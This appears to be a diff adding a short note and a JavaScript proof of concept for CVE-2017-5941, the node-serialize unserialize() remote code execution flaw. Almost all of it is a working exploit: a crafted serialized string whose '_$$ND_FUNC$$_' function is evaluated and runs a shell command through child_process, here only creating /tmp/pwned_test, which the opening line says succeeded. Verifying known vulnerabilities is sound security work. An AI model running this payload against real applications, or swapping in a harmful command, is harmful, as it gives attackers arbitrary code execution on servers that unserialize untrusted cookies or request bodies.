@@ -1,0 +1,14 @@
+Confirmed the exploit works — it created `/tmp/pwned_test`, proving arbitrary code execution via `unserialize()`.
+
+```javascript
+const serialize = require("./node_modules/node-serialize");
+
+// CVE-2017-5941: node-serialize's unserialize() eval()s any string value
+// prefixed with "_$$ND_FUNC$$_", allowing arbitrary code execution when
+// unserializing attacker-controlled data (e.g. from a cookie or API body).
+const payload = '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'touch /tmp/pwned_test\')}()"}';
+
+serialize.unserialize(payload);
+
+console.log("Executed. Check for /tmp/pwned_test");
+```
